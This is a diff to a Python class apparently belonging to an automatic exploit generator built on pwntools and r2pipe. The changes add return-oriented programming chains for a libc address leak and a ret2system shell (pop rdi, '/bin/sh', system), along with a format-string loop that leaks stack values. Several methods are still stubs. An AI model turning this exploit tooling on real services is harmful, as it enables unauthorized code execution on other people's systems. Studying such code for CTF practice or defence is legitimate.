@@ -1,7 +1,10 @@
-import pwn
 import logging
 import r2pipe
 
+import binaryninja as bn
+
+
+from pwn import *
 from binascii import *
 from rage.machine import Machine
 from rage.log import aegis_log
@@ -12,11 +15,19 @@ class Against:
 
     def __init__(self, binary_path, libc, machine: Machine, ip, port):
         """Create the against class."""
-        self.binary = binary_path
-        self.libc_path = libc
-        self.libc = pwn.ELF(libc)
-        self.machine = machine
 
+        context.update(
+            arch = "amd64",
+            endian = "little",
+            log_level = "CRITICAL",
+            os = "linux"
+        )
+
+        self.binary = binary_path
+        self.elf = ELF(self.binary)
+        self.libc_path = libc
+        self.libc = libc
+        self.machine = machine
         self.ip = ip
         self.port = port
 
@@ -36,17 +47,19 @@ class Against:
         """
 
         if option == "REMOTE":
-            return pwn.remote(self.ip, self.port)
+            return remote(self.ip, self.port)
         elif option == "GDB":
-            return pwn.gdb.debug(self.binary, gdbscript=gs)
+            return gdb.debug(self.binary, gdbscript=gs)
         else:
-            return pwn.process(self.binary)
+            return process(self.binary)
 
     def rop_chain_write_string(self, string, writable_address):
         """Return a rop chain to write a string into the binary."""
         chain = b""
 
         write_gadget = self.machine.find_write_gadget()
+        aegis_log.info(f"Using write gadget {write_gadget}")
+        write_gadget_address = int(write_gadget[0].split(b":")[0],16)
 
         return chain
 
@@ -60,14 +73,32 @@ class Against:
         """Return a rop chain that prints out a got address for a function."""
         chain = b""
 
-        leak_functions = self.machine.find_functions(["puts", "printf"])
-        print(leak_functions)
+        leak_function = self.machine.find_functions(["puts", "printf"])[0]
+        leak_gadget = int(self.machine.find_reg_gadget("rdi")[0].split(b":")[0].strip(), 16)
+
+        got_function = self.elf.got[leak_function]
+        plt_function = self.elf.plt[leak_function]
+        main = self.elf.sym["main"]
+
+        chain += p64(leak_gadget) + p64(got_function) + p64(plt_function)
+        chain += p64(main)
+
+        aegis_log.info(f"Setting up libc leak with {leak_function}")
 
         return chain
 
     def rop_chain_libc(self, libc_base):
         """Return a ROP chain for ret2system in libc."""
         chain = b""
+
+        r = ROP(self.libc)
+        system = p64(self.libc.sym["system"] + libc_base)
+        pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
+        ret = p64(u64(pop_rdi) + 1)
+        binsh = p64(next(self.libc.search(b"/bin/sh\x00")))
+
+        chain += pop_rdi + binsh + system
+
         return chain
 
     def rop_chain_srop_exec(self):
@@ -114,7 +145,7 @@ class Against:
         # Run the process for stack len amount of times
         # leak the entire stack.
         for i in range(1, stack_len):
-            p = pwn.process(self.binary)
+            p = process(self.binary)
             offset_str = "%" + str(i) + "$p."
             p.sendline(bytes(offset_str, "utf-8"))
             # !TODO Change >>> to find input
@@ -166,7 +197,7 @@ class Against:
         """Return a format write string payload."""
         return None
 
-    def send_exploit(self, process):
+    def send_exploit(self, process, exploit):
         """Send the exploit that was generated."""
         return None
 
